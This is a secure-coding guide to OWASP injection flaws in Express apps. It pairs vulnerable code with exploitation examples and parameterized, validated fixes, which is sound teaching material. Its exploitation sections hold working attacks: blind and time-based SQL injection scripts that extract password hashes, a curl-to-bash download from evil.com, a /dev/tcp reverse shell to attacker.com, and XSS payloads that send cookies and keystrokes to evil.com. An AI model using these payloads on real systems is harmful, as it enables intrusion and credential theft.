---
title: "A03: Injection"
description: Comprehensive guide to injection vulnerabilities including SQL injection (classic, blind, time-based, second-order), NoSQL injection, OS command injection, LDAP injection, and XSS with complete exploitation and remediation examples
tags: [security, owasp, injection, sql-injection, xss, nosql, command-injection]
difficulty: advanced
prerequisites:
  - owasp/index
  - Understanding of SQL and database concepts
  - TypeScript and Express.js fundamentals
  - Basic HTML and JavaScript knowledge
lastReviewed: "2026-03-17"
---

# A03: Injection

Injection flaws occur when an application sends untrusted data to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without authorization. Injection was the number one risk in the OWASP Top 10 from 2010 through 2017, and remains critically important at position three in 2021.

## The Root Cause

Every injection vulnerability shares the same root cause: **mixing code and data in the same channel**. When user input is concatenated directly into a query, command, or markup string, the interpreter cannot distinguish between the intended structure and the injected content.

## 1. SQL Injection — Classic (In-Band)

Classic SQL injection occurs when the attacker can see the results of the injected query directly in the application's response.

### Vulnerable Code

```typescript
import express, { Request, Response } from 'express';
import { Pool } from 'pg';

const pool = new Pool();
const app = express();

// VULNERABLE: String concatenation in SQL query
app.get('/api/users', async (req: Request, res: Response) => {
  const { search } = req.query;
  const query = `SELECT id, name, email FROM users WHERE name LIKE '%${search}%'`;
  const result = await pool.query(query);
  res.json(result.rows);
});

// VULNERABLE: Template literal in SQL query
app.get('/api/products/:category', async (req: Request, res: Response) => {
  const { category } = req.params;
  const { sort, order } = req.query;
  const query = `
    SELECT * FROM products
    WHERE category = '${category}'
    ORDER BY ${sort} ${order}
  `;
  const result = await pool.query(query);
  res.json(result.rows);
});

// VULNERABLE: Login bypass
app.post('/api/login', async (req: Request, res: Response) => {
  const { username, password } = req.body;
  const query = `
    SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'
  `;
  const result = await pool.query(query);

  if (result.rows.length > 0) {
    res.json({ message: 'Login successful', user: result.rows[0] });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### Exploitation

**Authentication Bypass:**

```
Username: admin' --
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

The -- comments out the password check, logging in as admin.
```

**UNION-Based Data Extraction:**

```
GET /api/users?search=' UNION SELECT id, username, password FROM users --

Resulting query:
SELECT id, name, email FROM users WHERE name LIKE '%' UNION SELECT id, username, password FROM users --%'

This appends all usernames and password hashes to the response.
```

**Determining Column Count (for UNION attacks):**

```
' ORDER BY 1 --     (works)
' ORDER BY 2 --     (works)
' ORDER BY 3 --     (works)
' ORDER BY 4 --     (error — table has 3 columns)
```

**Extracting Database Schema:**

```sql
-- PostgreSQL: List all tables
' UNION SELECT table_name, column_name, data_type FROM information_schema.columns --

-- MySQL: List all tables
' UNION SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = database() --

-- Extract specific data
' UNION SELECT username, password, null FROM admin_users --
```

### Secure Code

```typescript
// SECURE: Parameterized queries (prepared statements)
app.get('/api/users', async (req: Request, res: Response) => {
  const search = req.query.search as string || '';

  // $1 is a parameter placeholder — the database driver handles escaping
  const result = await pool.query(
    'SELECT id, name, email FROM users WHERE name ILIKE $1',
    [`%${search}%`]
  );

  res.json(result.rows);
});

// SECURE: Parameterized query with allowlist for ORDER BY
const ALLOWED_SORT_COLUMNS = new Set(['name', 'price', 'created_at', 'rating']);
const ALLOWED_ORDER = new Set(['ASC', 'DESC']);

app.get('/api/products/:category', async (req: Request, res: Response) => {
  const { category } = req.params;
  const sort = ALLOWED_SORT_COLUMNS.has(req.query.sort as string)
    ? req.query.sort as string
    : 'name';
  const order = ALLOWED_ORDER.has((req.query.order as string)?.toUpperCase())
    ? (req.query.order as string).toUpperCase()
    : 'ASC';

  // Category is parameterized; sort and order are from an allowlist
  const result = await pool.query(
    `SELECT * FROM products WHERE category = $1 ORDER BY ${sort} ${order}`,
    [category]
  );

  res.json(result.rows);
});

// SECURE: Login with parameterized query and proper password handling
app.post('/api/login', async (req: Request, res: Response) => {
  const { username, password } = req.body;

  const result = await pool.query(
    'SELECT id, username, password_hash, role FROM users WHERE username = $1',
    [username]
  );

  if (result.rows.length === 0) {
    // Perform dummy hash comparison to prevent timing attacks
    await argon2.hash(password);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const user = result.rows[0];
  const passwordValid = await argon2.verify(user.password_hash, password);

  if (!passwordValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate token and return
  const token = await createAccessToken(user);
  res.json({ token });
});
```

---

## 2. SQL Injection — Blind (Boolean-Based)

Blind SQL injection occurs when the application does not return query results or error messages, but the attacker can infer information by observing different application behavior (e.g., a different response for "true" vs. "false" conditions).

### Vulnerable Code

```typescript
// VULNERABLE: The response differs based on whether the injected condition is true
app.get('/api/users/:id', async (req: Request, res: Response) => {
  const { id } = req.params;
  const query = `SELECT * FROM users WHERE id = ${id}`;
  const result = await pool.query(query);

  if (result.rows.length > 0) {
    res.json({ exists: true, name: result.rows[0].name });
  } else {
    res.json({ exists: false });
  }
});
```

### Exploitation

The attacker asks yes/no questions to extract data one bit at a time:

```
-- Is the first character of the admin password hash 'a'?
GET /api/users/1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'a'

-- Response: { exists: true } → first character is 'a'
-- Response: { exists: false } → first character is NOT 'a'

-- Using ASCII values for binary search (faster):
GET /api/users/1 AND ASCII(SUBSTRING((SELECT password_hash FROM users WHERE username='admin'), 1, 1)) > 96

-- Automated extraction script:
```

```python
import requests

url = "https://target.com/api/users/"
extracted = ""

for position in range(1, 65):  # 64-character hash
    low, high = 32, 126  # Printable ASCII range

    while low < high:
        mid = (low + high) // 2
        payload = f"1 AND ASCII(SUBSTRING((SELECT password_hash FROM users WHERE username='admin'), {position}, 1)) > {mid}"

        response = requests.get(f"{url}{payload}")
        data = response.json()

        if data.get("exists"):
            low = mid + 1
        else:
            high = mid

    extracted += chr(low)
    print(f"Extracted so far: {extracted}")
```

### Secure Code

```typescript
// SECURE: Parameterized query — blind SQLi is impossible
app.get('/api/users/:id', async (req: Request, res: Response) => {
  const id = parseInt(req.params.id, 10);

  if (isNaN(id) || id <= 0) {
    return res.status(400).json({ error: 'Invalid user ID' });
  }

  const result = await pool.query(
    'SELECT id, name FROM users WHERE id = $1',
    [id]
  );

  if (result.rows.length > 0) {
    res.json({ exists: true, name: result.rows[0].name });
  } else {
    res.json({ exists: false });
  }
});
```

---

## 3. SQL Injection — Time-Based Blind

When the application returns identical responses regardless of the query result, attackers use time delays to infer information.

### Exploitation

```sql
-- PostgreSQL: If the first character is 'a', sleep for 5 seconds
GET /api/users/1; SELECT CASE WHEN (SUBSTRING((SELECT password_hash FROM users LIMIT 1), 1, 1) = 'a') THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- MySQL:
GET /api/users/1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) --

-- MSSQL:
GET /api/users/1; IF (SUBSTRING((SELECT TOP 1 password FROM users), 1, 1) = 'a') WAITFOR DELAY '0:0:5' --
```

```python
import requests
import time

url = "https://target.com/api/users/"
extracted = ""

for position in range(1, 65):
    for char_code in range(32, 127):
        char = chr(char_code)
        payload = f"1; SELECT CASE WHEN (SUBSTRING((SELECT password_hash FROM users WHERE username='admin'), {position}, 1) = '{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END --"

        start = time.time()
        requests.get(f"{url}{payload}")
        elapsed = time.time() - start

        if elapsed >= 3:
            extracted += char
            print(f"Position {position}: {char} (extracted: {extracted})")
            break
```

### Defense

The same parameterized query defense applies. Additionally, set query timeouts:

```typescript
// Database-level timeout
const pool = new Pool({
  statement_timeout: 5000,  // Kill queries running longer than 5 seconds
  query_timeout: 10000,
});
```

---

## 4. Second-Order SQL Injection

Second-order SQL injection occurs when user input is stored safely, but later used unsafely in a different query. The input is "harmless" when stored but becomes dangerous when retrieved and concatenated into a new query.

### Vulnerable Code

```typescript
// Step 1: Registration — input is safely stored using parameterized query
app.post('/api/register', async (req: Request, res: Response) => {
  const { username, email, password } = req.body;
  const passwordHash = await argon2.hash(password);

  // This is safe — parameterized query
  await pool.query(
    'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3)',
    [username, email, passwordHash]
  );

  res.status(201).json({ message: 'Registered' });
});

// Step 2: Password change — VULNERABLE: uses stored username unsafely
app.post('/api/change-password', async (req: Request, res: Response) => {
  const { newPassword } = req.body;
  const userId = req.user!.id;

  // Fetch the username from the database (safe so far)
  const userResult = await pool.query(
    'SELECT username FROM users WHERE id = $1',
    [userId]
  );
  const username = userResult.rows[0].username;

  // VULNERABLE: The stored username is concatenated into a new query
  const newHash = await argon2.hash(newPassword);
  await pool.query(
    `UPDATE users SET password_hash = '${newHash}' WHERE username = '${username}'`
  );

  res.json({ message: 'Password changed' });
});
```

### Exploitation

```
1. Register with username: admin' --
2. This is stored safely in the database
3. When the attacker changes their own password, the query becomes:
   UPDATE users SET password_hash = '<new_hash>' WHERE username = 'admin' --'
4. This changes the admin's password instead of the attacker's
```

### Secure Code

```typescript
// SECURE: Parameterize ALL queries, even those using data from the database
app.post('/api/change-password', async (req: Request, res: Response) => {
  const { newPassword } = req.body;
  const userId = req.user!.id;

  const newHash = await argon2.hash(newPassword);

  // Use the user ID (integer, from the verified JWT) instead of the username
  await pool.query(
    'UPDATE users SET password_hash = $1 WHERE id = $2',
    [newHash, userId]
  );

  res.json({ message: 'Password changed' });
});
```

**Key lesson:** Never trust data from the database. Treat all data as untrusted, regardless of its origin.

---

## 5. NoSQL Injection

NoSQL databases like MongoDB use different query languages, but they are still vulnerable to injection when user input is used to construct queries.

### Vulnerable Code

```typescript
import { MongoClient, Db } from 'mongodb';

let db: Db;

// VULNERABLE: Query operator injection
app.post('/api/login', async (req: Request, res: Response) => {
  const { username, password } = req.body;

  // If the attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // This matches ANY user where username > "" AND password > ""
  const user = await db.collection('users').findOne({
    username: username,
    password: password,
  });

  if (user) {
    res.json({ message: 'Login successful', user });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// VULNERABLE: $where injection (JavaScript execution)
app.get('/api/search', async (req: Request, res: Response) => {
  const { query } = req.query;

  // The attacker can inject JavaScript that runs on the MongoDB server
  const results = await db.collection('products').find({
    $where: `this.name.includes('${query}')`,
  }).toArray();

  res.json(results);
});

// VULNERABLE: Aggregation pipeline injection
app.get('/api/stats', async (req: Request, res: Response) => {
  const { groupBy } = req.query;

  const pipeline = [
    { $group: { _id: `$${groupBy}`, count: { $sum: 1 } } },
  ];

  const results = await db.collection('orders').aggregate(pipeline).toArray();
  res.json(results);
});
```

### Exploitation

**Query Operator Injection:**

```json
// Attacker sends this as the request body:
{
  "username": { "$gt": "" },
  "password": { "$gt": "" }
}

// This becomes: db.users.findOne({ username: {$gt: ""}, password: {$gt: ""} })
// Returns the first user in the collection (often admin)

// Or using $ne (not equal):
{
  "username": "admin",
  "password": { "$ne": "" }
}
// Matches admin if their password is not empty (always true)

// Using $regex to enumerate:
{
  "username": "admin",
  "password": { "$regex": "^a" }
}
// Test if password starts with 'a', then 'aa', 'ab', etc.
```

**$where Injection:**

```
GET /api/search?query='; while(true){} //'
// Causes infinite loop — DoS attack

GET /api/search?query='; return true; var x='
// Returns all documents
```

### Secure Code

```typescript
import { z } from 'zod';

// SECURE: Input validation and type enforcement
const loginSchema = z.object({
  username: z.string().min(1).max(50),
  password: z.string().min(1).max(128),
});

app.post('/api/login', async (req: Request, res: Response) => {
  const parseResult = loginSchema.safeParse(req.body);

  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { username, password } = parseResult.data;

  // Type is guaranteed to be string by Zod — no operator injection possible
  const user = await db.collection('users').findOne({
    username: username, // Guaranteed string, not an object
  });

  if (!user) {
    await argon2.hash(password); // Timing attack prevention
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const passwordValid = await argon2.verify(user.passwordHash, password);

  if (!passwordValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const token = await createAccessToken(user);
  res.json({ token });
});

// SECURE: Sanitize MongoDB operators
function sanitizeMongoInput(input: unknown): unknown {
  if (typeof input === 'string' || typeof input === 'number' || typeof input === 'boolean') {
    return input;
  }

  if (input === null || input === undefined) {
    return input;
  }

  if (Array.isArray(input)) {
    return input.map(sanitizeMongoInput);
  }

  if (typeof input === 'object') {
    const sanitized: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(input as Record<string, unknown>)) {
      // Strip keys that start with $ (MongoDB operators)
      if (key.startsWith('$')) {
        continue;
      }
      sanitized[key] = sanitizeMongoInput(value);
    }
    return sanitized;
  }

  return undefined;
}

// SECURE: Allowlist for aggregation fields
const ALLOWED_GROUP_FIELDS = new Set(['category', 'status', 'region']);

app.get('/api/stats', async (req: Request, res: Response) => {
  const groupBy = req.query.groupBy as string;

  if (!ALLOWED_GROUP_FIELDS.has(groupBy)) {
    return res.status(400).json({ error: 'Invalid groupBy field' });
  }

  const pipeline = [
    { $group: { _id: `$${groupBy}`, count: { $sum: 1 } } },
  ];

  const results = await db.collection('orders').aggregate(pipeline).toArray();
  res.json(results);
});

// SECURE: Never use $where — use standard query operators instead
app.get('/api/search', async (req: Request, res: Response) => {
  const query = z.string().max(100).parse(req.query.query);

  const results = await db.collection('products').find({
    name: { $regex: escapeRegex(query), $options: 'i' },
  }).limit(50).toArray();

  res.json(results);
});

function escapeRegex(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
```

---

## 6. OS Command Injection

Command injection occurs when an application passes user-controlled input to a system shell. The attacker can chain additional commands using shell metacharacters (`;`, `|`, `&&`, `||`, `` ` ``, `$()`).

### Vulnerable Code

```typescript
import { exec } from 'child_process';

// VULNERABLE: User input passed directly to exec
app.get('/api/ping', (req: Request, res: Response) => {
  const host = req.query.host as string;

  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// VULNERABLE: File processing with user-controlled filename
app.post('/api/convert', (req: Request, res: Response) => {
  const { filename, format } = req.body;

  exec(`convert /uploads/${filename} /uploads/output.${format}`, (error, stdout) => {
    res.json({ message: 'Converted' });
  });
});

// VULNERABLE: DNS lookup
app.get('/api/dns', (req: Request, res: Response) => {
  const domain = req.query.domain as string;

  exec(`nslookup ${domain}`, (error, stdout) => {
    res.send(stdout);
  });
});
```

### Exploitation

```bash
# Command chaining with semicolons
GET /api/ping?host=127.0.0.1;cat /etc/passwd

# Command chaining with pipe
GET /api/ping?host=127.0.0.1|id

# Command substitution
GET /api/ping?host=$(whoami)

# Backtick command substitution
GET /api/ping?host=`whoami`

# AND operator
GET /api/ping?host=127.0.0.1 && curl https://evil.com/shell.sh | bash

# Newline injection
GET /api/ping?host=127.0.0.1%0aid

# Reverse shell
GET /api/ping?host=;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### Secure Code

```typescript
import { execFile, spawn } from 'child_process';
import { z } from 'zod';
import dns from 'dns/promises';
import net from 'net';

// SECURE: Use execFile (does not invoke a shell) with input validation
app.get('/api/ping', (req: Request, res: Response) => {
  const hostSchema = z.string().regex(/^[a-zA-Z0-9.-]+$/).max(253);
  const parseResult = hostSchema.safeParse(req.query.host);

  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid hostname' });
  }

  const host = parseResult.data;

  // Validate it's a valid IP or hostname
  if (!net.isIP(host) && !/^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$/.test(host)) {
    return res.status(400).json({ error: 'Invalid hostname format' });
  }

  // execFile does NOT invoke a shell — arguments are passed directly
  execFile('ping', ['-c', '4', host], { timeout: 10000 }, (error, stdout) => {
    if (error) {
      return res.status(500).json({ error: 'Ping failed' });
    }
    res.send(stdout);
  });
});

// SECURE: Use Node.js built-in APIs instead of shell commands
app.get('/api/dns', async (req: Request, res: Response) => {
  const domainSchema = z.string().regex(/^[a-zA-Z0-9.-]+$/).max(253);
  const parseResult = domainSchema.safeParse(req.query.domain);

  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid domain' });
  }

  try {
    const addresses = await dns.resolve(parseResult.data);
    res.json({ addresses });
  } catch {
    res.status(404).json({ error: 'DNS resolution failed' });
  }
});

// SECURE: Use spawn with explicit arguments (no shell)
app.post('/api/convert', (req: Request, res: Response) => {
  const schema = z.object({
    filename: z.string().regex(/^[a-zA-Z0-9_-]+\.(png|jpg|gif|webp)$/),
    format: z.enum(['png', 'jpg', 'webp']),
  });

  const parseResult = schema.safeParse(req.body);

  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { filename, format } = parseResult.data;
  const inputPath = path.join('/app/uploads', filename);
  const outputPath = path.join('/app/uploads', `output.${format}`);

  // Verify paths are within the uploads directory
  if (!inputPath.startsWith('/app/uploads/') || !outputPath.startsWith('/app/uploads/')) {
    return res.status(400).json({ error: 'Invalid path' });
  }

  const child = spawn('convert', [inputPath, outputPath], {
    shell: false,  // Explicitly no shell
    timeout: 30000,
    env: {},       // Empty environment — no inherited variables
  });

  child.on('close', (code) => {
    if (code === 0) {
      res.json({ message: 'Converted' });
    } else {
      res.status(500).json({ error: 'Conversion failed' });
    }
  });
});
```

---

## 7. LDAP Injection

LDAP injection occurs when user input is used to construct LDAP queries without proper sanitization.

### Vulnerable Code

```typescript
import ldap from 'ldapjs';

const client = ldap.createClient({ url: 'ldap://ldap.example.com' });

// VULNERABLE: User input in LDAP filter
app.post('/api/ldap-login', (req: Request, res: Response) => {
  const { username, password } = req.body;

  // Attacker can inject LDAP filter operators
  const filter = `(&(uid=${username})(userPassword=${password}))`;

  client.search('dc=example,dc=com', { filter, scope: 'sub' }, (err, searchRes) => {
    const entries: any[] = [];
    searchRes.on('searchEntry', (entry) => entries.push(entry));
    searchRes.on('end', () => {
      if (entries.length > 0) {
        res.json({ message: 'Authenticated' });
      } else {
        res.status(401).json({ error: 'Invalid credentials' });
      }
    });
  });
});
```

### Exploitation

```
# Bypass authentication — the * wildcard matches any value
Username: *
Password: *
Filter becomes: (&(uid=*)(userPassword=*))
Matches ALL users

# Bypass authentication with injection
Username: admin)(|(uid=*
Password: anything
Filter becomes: (&(uid=admin)(|(uid=*)(userPassword=anything)))
The injected OR condition matches any uid

# Extract information
Username: *)(objectClass=*
Password: anything
Filter becomes: (&(uid=*)(objectClass=*)(userPassword=anything))
```

### Secure Code

```typescript
// SECURE: Escape LDAP special characters
function escapeLDAPFilter(input: string): string {
  return input.replace(/[\\*()\/\0]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16).padStart(2, '0');
  });
}

app.post('/api/ldap-login', (req: Request, res: Response) => {
  const schema = z.object({
    username: z.string().min(1).max(50).regex(/^[a-zA-Z0-9._-]+$/),
    password: z.string().min(1).max(128),
  });

  const parseResult = schema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { username, password } = parseResult.data;
  const escapedUsername = escapeLDAPFilter(username);

  // Step 1: Find the user by username
  const searchFilter = `(&(uid=${escapedUsername})(objectClass=person))`;

  client.search('dc=example,dc=com', {
    filter: searchFilter,
    scope: 'sub',
    attributes: ['dn'],
  }, (err, searchRes) => {
    const entries: any[] = [];
    searchRes.on('searchEntry', (entry) => entries.push(entry));
    searchRes.on('end', () => {
      if (entries.length !== 1) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }

      // Step 2: Attempt to bind as the found user (verifies password)
      const userDN = entries[0].dn.toString();
      const bindClient = ldap.createClient({ url: 'ldap://ldap.example.com' });

      bindClient.bind(userDN, password, (bindErr) => {
        bindClient.unbind();

        if (bindErr) {
          return res.status(401).json({ error: 'Invalid credentials' });
        }

        res.json({ message: 'Authenticated' });
      });
    });
  });
});
```

---

## 8. Cross-Site Scripting (XSS) — Reflected

Reflected XSS occurs when malicious script is reflected off a web application to the victim's browser. The script is part of the request (usually a URL parameter) and is included in the response without proper encoding.

### Vulnerable Code

```typescript
// VULNERABLE: Reflecting user input in HTML without encoding
app.get('/search', (req: Request, res: Response) => {
  const query = req.query.q as string;

  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>No results found.</p>
      </body>
    </html>
  `);
});

// VULNERABLE: Error message reflects input
app.get('/user/:username', (req: Request, res: Response) => {
  const { username } = req.params;

  res.status(404).send(`
    <html>
      <body>
        <p>User "${username}" not found.</p>
      </body>
    </html>
  `);
});
```

### Exploitation

```
https://target.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

https://target.com/search?q=<img src=x onerror="fetch('https://evil.com/steal',{method:'POST',body:document.cookie})">

https://target.com/search?q=<svg onload="alert(document.domain)">
```

### Secure Code

```typescript
import escapeHtml from 'escape-html';

// SECURE: HTML-encode all user input before inserting into HTML
app.get('/search', (req: Request, res: Response) => {
  const query = escapeHtml(req.query.q as string || '');

  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>No results found.</p>
      </body>
    </html>
  `);
});

// Even better: Use a templating engine with auto-escaping
// EJS, Handlebars, Pug, and Nunjucks all auto-escape by default
```

---

## 9. Cross-Site Scripting (XSS) — Stored

Stored XSS (persistent XSS) occurs when the injected script is permanently stored on the target server — in a database, comment section, forum post, or user profile. Every user who views the affected page executes the malicious script.

### Vulnerable Code

```typescript
// VULNERABLE: Storing and rendering user-generated content without sanitization
app.post('/api/comments', async (req: Request, res: Response) => {
  const { postId, content } = req.body;
  const userId = req.user!.id;

  // Content is stored as-is — including any HTML/JavaScript
  await pool.query(
    'INSERT INTO comments (post_id, user_id, content) VALUES ($1, $2, $3)',
    [postId, userId, content]
  );

  res.status(201).json({ message: 'Comment posted' });
});

app.get('/api/posts/:postId/comments', async (req: Request, res: Response) => {
  const result = await pool.query(
    'SELECT c.content, u.name FROM comments c JOIN users u ON c.user_id = u.id WHERE c.post_id = $1',
    [req.params.postId]
  );

  // Rendering raw HTML — stored XSS payload will execute
  const html = result.rows.map(row =>
    `<div class="comment">
      <strong>${row.name}</strong>
      <p>${row.content}</p>
    </div>`
  ).join('');

  res.send(html);
});
```

### Exploitation

```
POST /api/comments
{
  "postId": 1,
  "content": "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>"
}

// More sophisticated: keylogger
{
  "content": "<script>document.onkeypress=function(e){new Image().src='https://evil.com/log?k='+e.key}</script>"
}

// Bypassing basic filters:
{
  "content": "<img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20vc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))>"
}
```

### Secure Code

```typescript
import DOMPurify from 'isomorphic-dompurify';
import escapeHtml from 'escape-html';

// Option 1: Strip all HTML (for plain text content like comments)
app.post('/api/comments', async (req: Request, res: Response) => {
  const { postId, content } = req.body;
  const userId = req.user!.id;

  // Sanitize: remove all HTML tags
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: [],     // No HTML tags allowed
    ALLOWED_ATTR: [],     // No attributes allowed
  });

  await pool.query(
    'INSERT INTO comments (post_id, user_id, content) VALUES ($1, $2, $3)',
    [postId, userId, sanitized]
  );

  res.status(201).json({ message: 'Comment posted' });
});

// Option 2: Allow safe HTML subset (for rich text editors)
app.post('/api/articles', async (req: Request, res: Response) => {
  const { title, content } = req.body;
  const userId = req.user!.id;

  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'h2', 'h3', 'h4'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['target'],          // Allow target attribute
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus', 'style'],
  });

  // Additional: ensure links use safe protocols
  const sanitizedWithSafeLinks = DOMPurify.sanitize(sanitizedContent, {
    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  });

  await pool.query(
    'INSERT INTO articles (title, user_id, content) VALUES ($1, $2, $3)',
    [escapeHtml(title), userId, sanitizedWithSafeLinks]
  );

  res.status(201).json({ message: 'Article published' });
});

// When rendering: always encode for the output context
app.get('/api/posts/:postId/comments', async (req: Request, res: Response) => {
  const result = await pool.query(
    'SELECT c.content, u.name FROM comments c JOIN users u ON c.user_id = u.id WHERE c.post_id = $1 ORDER BY c.created_at',
    [req.params.postId]
  );

  const html = result.rows.map(row =>
    `<div class="comment">
      <strong>${escapeHtml(row.name)}</strong>
      <p>${escapeHtml(row.content)}</p>
    </div>`
  ).join('');

  res.send(html);
});
```

---

## 10. Cross-Site Scripting (XSS) — DOM-Based

DOM-based XSS occurs entirely in the browser. The malicious payload never reaches the server — it is processed by client-side JavaScript that writes user-controlled data to the DOM without proper sanitization.

### Vulnerable Code (Client-Side)

```html
<script>
  // VULNERABLE: Reading from URL fragment and inserting into DOM
  const hash = window.location.hash.substring(1);
  document.getElementById('content').innerHTML = hash;

  // VULNERABLE: Using URL parameters in DOM manipulation
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name');
  document.getElementById('greeting').innerHTML = `Welcome, ${name}!`;

  // VULNERABLE: document.write with user-controlled input
  const lang = params.get('lang');
  document.write(`<script src="/i18n/${lang}.js"><\/script>`);

  // VULNERABLE: eval with user-controlled input
  const formula = params.get('calc');
  const result = eval(formula);
  document.getElementById('result').textContent = result;

  // VULNERABLE: jQuery html() method
  const message = params.get('msg');
  $('#notification').html(message);
</script>
```

### Exploitation

```
https://target.com/page#<img src=x onerror=alert(document.cookie)>

https://target.com/page?name=<script>alert('XSS')</script>

https://target.com/page?lang=../../evil-script

https://target.com/page?calc=alert(document.cookie)

https://target.com/page?msg=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### Secure Code (Client-Side)

```html
<script>
  // SECURE: Use textContent instead of innerHTML
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name');
  document.getElementById('greeting').textContent = `Welcome, ${name}!`;

  // SECURE: Use createElement and textContent for dynamic content
  function addComment(commentText) {
    const div = document.createElement('div');
    div.className = 'comment';

    const p = document.createElement('p');
    p.textContent = commentText;  // textContent auto-escapes

    div.appendChild(p);
    document.getElementById('comments').appendChild(div);
  }

  // SECURE: Validate and sanitize URLs
  function setLink(url) {
    try {
      const parsed = new URL(url);
      if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
        throw new Error('Invalid protocol');
      }
      document.getElementById('link').href = parsed.href;
    } catch {
      console.error('Invalid URL');
    }
  }

  // SECURE: Never use eval — use safe alternatives
  // Instead of eval(formula), use a math parser library
  // import { evaluate } from 'mathjs';
  // const result = evaluate(formula);

  // SECURE: Use DOMPurify for any HTML that must be rendered
  // import DOMPurify from 'dompurify';
  // element.innerHTML = DOMPurify.sanitize(userInput);
</script>
```

---

## XSS Prevention Summary

| Context | Encoding Method | Example |
|---------|----------------|---------|
| HTML body | HTML entity encoding | `&lt;script&gt;` |
| HTML attribute | HTML attribute encoding + quote | `value="user&quot;input"` |
| JavaScript | JavaScript hex encoding | `\x3cscript\x3e` |
| URL parameter | URL encoding | `%3Cscript%3E` |
| CSS | CSS hex encoding | `\3C script\3E` |
| JSON | JSON serialization | `{"key":"user\\u003Cscript\\u003E"}` |

### Content Security Policy (Additional Layer)

```typescript
// Set CSP headers to prevent inline script execution even if XSS occurs
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `font-src 'self'`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `object-src 'none'`,
  ].join('; '));

  next();
});
```

---

## Testing Methodology for All Injection Types

### Automated Tools

| Tool | Purpose |
|------|---------|
| SQLMap | Automated SQL injection detection and exploitation |
| NoSQLMap | NoSQL injection scanner |
| Commix | OS command injection scanner |
| Burp Suite | Comprehensive web security scanner |
| OWASP ZAP | Open-source web security scanner |
| XSStrike | XSS detection with fuzzing |
| Dalfox | Parameter-based XSS scanner |

### Manual Testing Checklist

1. **Identify all input vectors** — URL parameters, form fields, headers, cookies, file uploads, JSON/XML bodies
2. **Test each input with injection payloads** — Start with simple probes, escalate to complex payloads
3. **Observe the response** — Look for reflected input, error messages, behavioral changes, time delays
4. **Test encoding bypasses** — URL encoding, double encoding, Unicode, HTML entities
5. **Test filter evasion** — Case variation, null bytes, comments, alternative syntax
6. **Verify fixes** — After remediation, re-test with the same payloads and new bypass attempts

### SQL Injection Test Payloads

```
' OR '1'='1
' OR '1'='1' --
" OR "1"="1
1; DROP TABLE users --
' UNION SELECT NULL --
' AND 1=1 --
' AND 1=2 --
1' AND (SELECT SLEEP(5)) --
```

### XSS Test Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

## Prevention Checklist

- [ ] Use parameterized queries (prepared statements) for ALL SQL queries
- [ ] Use ORMs with parameterized query support (Prisma, TypeORM, Drizzle)
- [ ] Validate all input with a schema validator (Zod, Joi)
- [ ] Use allowlists for dynamic column names and sort orders
